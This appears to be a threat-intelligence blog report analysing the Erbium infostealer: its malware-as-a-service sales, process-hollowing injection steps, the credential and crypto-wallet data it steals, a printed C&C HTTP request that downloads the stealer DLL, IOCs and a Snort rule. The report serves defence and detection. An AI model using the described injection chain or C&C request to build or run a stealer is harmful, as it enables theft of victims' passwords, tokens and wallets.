The author stated that its malware is the best on the market, giving to the user unique features and that its\ndevelopment took several months of work.\n\n\n-----\n\n_Erbium InfoStealer Logo_\n\nIn the beginning the malware was sold at a price ranging between 9 to 150 dollars depending on the user plan, going from one week to one\nyear of license. The prices from July to August were significantly increased, going for a minimum of 100 dollars for one month of usage to a\nthousand of dollars for a year of the service, including the access to a control panel Cluster25 had the opportunity to observe and analyze.\nInteresting to note that after having a site, now the service is all administered through a Telegram bot, that works as a marketplace and also as\na control for the data stolen, that can be redirected to a Telegram account other than the personal control panel. The bot was set up on early\nSeptember 2022.\n\n_Erbium Telegram Bot_\n\n## INSIGHTS\n\nCluster25 managed to obtain a variant of this threat and analyzed its characteristics and operational logic as well as carrying out an initial\ntelemetry assessment of the current spreading degree of this malware family. In the analyzed sample, the first stage of the infection consists in\na 32-bit PE executable with a highly obfuscated code. Moreover, the sample use polymorphic techniques to change its identifiable features in\norder to evade detection. During this phase, the malware reconstructs the string\n**_C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\AppLaunch.exe which is the path of the legit Microsoft Application Microsoft_**\n**_.NET ClickOnce Launch Utility._**\n\nThe string is used to create a new process dynamically calling the API CreateProcessW and passing the path of the AppLaunch.exe\nexecutable as one of its arguments. The code invoked during this and the following operations resides in the .data section and it is not present\non the original binary, signs that the executable is able to modify its sections during the execution, as evidence reported below.\n\n\n-----\n\nThen, the malware allocates memory in the new process calling the API VirtualAllocEx and passes the handle of the process as first\nargument. The argument lpaddress, which defines the desired starting address for the region of pages to allocate, is set to the value\n**_0x400000, the image base address. After this point, the API WriteProcessMemory_** is used to write the memory in the allocated region of the\nnew process, while the VirtualProtectEx is used to change the permissions to the memory in order to let it executable. Finally, the malware\ncalls the APIs SetThreadContext and ResumeThread to start the execution on the injected process. The second stage tries to perform an\n**HTTP connection to the Command-and-Control (C&C) domain. For the specific sample, the domain used is www[.]f0679086[.]xsph[.]ru,**\nhowever, the analysis of different samples allowed to detect also the domains mamamiya137[.]ru. The following is the HTTP request used by\nthe malware to communicate with the C&C server:\n\n**HTTP REQUEST**\n\n**GET /ErbiumDed/api.php?**\n**method=getstub&bid=1525449043%20%20%20%20%20%20&tag=malik_here%20%20%20%20%20%20%20%20%20%20%20%20%20%20**\n**HTTP/1.1**\n\n**Connection: Keep-Alive**\n\n**User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36**\n\n**Host: www[.]f0679086[.]xsph[.]ru**\n\nThe connection is used to download a DLL from the C&C, that is later loaded and executed in the memory of the same process\n(AppLaunch.exe). The 32-bit PE DLL is the last stage of the infection, which acts as the stealer itself. The stealer can grab the following\ninformation on the victim systems:\n\nDesktop screenshot from all monitors.\nPC information (CPU, GPU, DISK, RAM, number of monitors, monitor resolutions, monitor resolutions, MAC, Windows version, Windows\nowner, PC name, PC architecture, Windows license key)\nPasswords, cookies, history, maps, autofill from most popular browsers based on Gecko and Chromium\nCold wallets from browsers (MetaMask, TronLink, Binance Chain Wallet, Yoroi, Nifty Wallet, Math Wallet, Coinbase Wallet, Guarda,\nEQUAL Wallet, Jaxx Liberty, BitApp Wallet, iWallet, Wombat, MEW CX, GuildWallet, Saturn Wallet, Ronin Wallet, NeoLine, Clover Wallet,\nLiquality Wallet, Terra Station, Keplr, Sollet, Auro Wallet, Polymesh Wallet, ICONex, Nabox Wallet, KHC, Temple, TezBox, Cyano Wallet,\nByone, OneKey, LeafWallet, DAppPlay, BitClip, Steem Keychain, Nash Extension, Hycon Lite Client, ZilPay, Coin98 Wallet, Harmony,\nKardiaChain, Rabby, Phantom, TON Crystal Wallet)\nOther browser plugins (Authenticator, Authy, Trezor Password Manager, GAuth Authenticator, EOS Authenticator)\nSteam (list of accounts and authorization files)\nDiscord (tokens)\nFTP clients (FileZilla, Total Commander)\nTelegram (authorization files)\nCold desktop wallets (Exodus, Atomic, Armory, Bitecoin-Core, Bytecoin, Dash-Core, Electrum, Electron, Coinomi, Ethereum, LitecoinCore, Monero-Core, Zcash, Jaxx)\n\nAlso, the stealer can obtain the geolocalization of the victim system.\n\n## ATTACKER'S CONTROL PANEL\n\nCluster25 was able to acquired a very good amount of information about this threat including details about the control panel available on the\nattacker’s side.\n\n\n-----\n\n_Erbium Attacker's Control Panel_\n\nThe panel includes different tabs that groups the stolen information together according to their category.\n\nAlso, the panel contains a feature to send the stolen information directly to a Telegram Account.\n\n## ERBIUM IN THE WORLD\n\nErbium is enjoying success and within a month it has been possible to observe an increasing level of spread of this threat around the world.\nAccording to Cluster25 visibility, the following countries presented potential active infections to be linked to variants of this malware family:\n\n\n-----\n\n## CONCLUSIONS\n\nCyber-crime is constantly evolving within an underground market where it is not uncommon to come across new proposals for the purchase of\nMaaS solutions. In Cluster25's opinion Erbium could become one of the most used infostealers by cyber criminals due to its wide range of\ncapabilities and due to the growing demand for MaaS.\n\n## ATT&CK MATRIX\n\n**TACTIC** **TECHNIQUE** **DESCRIPTION**\n\nInitial Access T1566.001 Phishing: Spearphishing Attachment\n\nExecution T1204.001 User Execution: Malicious Link\n\nExecution T1204.002 User Execution: Malicious File\n\nExecution T1106 Native API\n\nPrivilege Escalation T1055.012 Process Injection: Process Hollowing\n\nPrivilege Escalation T1055.001 Process Injection: Dynamic-link Library Injection\n\nDefense Evasion T1140 Deobfuscate/Decode Files or Information\n\nDefense Evasion T1027 Obfuscated Files or Information\n\nDefense Evasion T1055.003 Process Injection: Thread Execution Hijacking\n\nDefense Evasion T1553.002 Subvert Trust Controls: Code Signing\n\nDefense Evasion T1562.001 Impair Defenses: Disable or Modify Tools\n\n\n-----\n\nDefense Evasion T1112 Modify Registry\n\nDefense Evasion T1202 Indirect Command Execution\n\nDefense Evasion T1497 Virtualization/Sandbox Evasion\n\nDefense Evasion T1620 Reflective Code Loading\n\nCredential Access T1555 Credentials from Password Stores\n\nCredential Access T1003 OS Credential Dumping\n\nCredential Access T1539 Steal Web Session Cookie\n\nDiscovery T1087 Account Discovery\n\nDiscovery T1622 Debugger Evasion\n\nDiscovery T1083 File and Directory Discovery\n\nDiscovery T1046 Network Service Discovery\n\nDiscovery T1057 Process Discovery\n\nDiscovery T1518 Software Discovery\n\nDiscovery T1033 System Owner/User Discovery\n\nDiscovery T1124 System Time Discovery\n\nCollection T1005 Data from Local System\n\nCollection T1113 Screen Capture\n\nCommand and Control T1071.001 Application Layer Protocol: Web Protocols\n\nExfiltration T1041 Exfiltration Over C2 Channel\n\n## INDICATORS OF COMPROMISE\n\n**CATEGORY** **TYPE** **VALUE**\n\nPAYLOAD MD5 e1826f107e517c0cb9a9b02f74cb94f2\n\nPAYLOAD SHA1 c994bc4ed56145b8ff80fb0c0fa47a39e19e0ca3\n\nPAYLAOD SHA256 164f6090aeabe48d2f9a2de12b8da6e8de24735a39371fe922e51689e969ad37\n\nPAYLOAD MD5 510a37df4f363a938e32cae45d661c9d\n\nPAYLOAD SHA1 0976c8d6bd898c06faf90a6b99097ca6f66cca0c\n\nPAYLOAD SHA256 cd83d5f6eec9731fbc6c1ce5eee962f82bcf881a63af1f478e6a097760f758df\n\nNETWORK CNC **mamamiya137[.]ru**\n\nNETWORK CNC **www[.]f0679086[.]xsph[.]ru**\n\n## DETECTION AND THREAT HUNTING\n\n**SNORT**\n```\n alert tcp any any -> any $HTTP_PORTS (\n msg: \"Cluster25 - Trojan/Erbium CnC\n Communication\";\n flow:established,to_server;\n content:\"GET\";\n nocase; http_method; content:\"/api.php\";\n content:\"method=getstub\";\n content:\"tag=\";\n http_uri;\n sid:100004;\n rev:1;\n )\n\n```\n\n-----\n\na a e, [te ge ce, ec](https://blog.cluster25.duskrise.com/tag/intelligence) e\n\n\n-----",
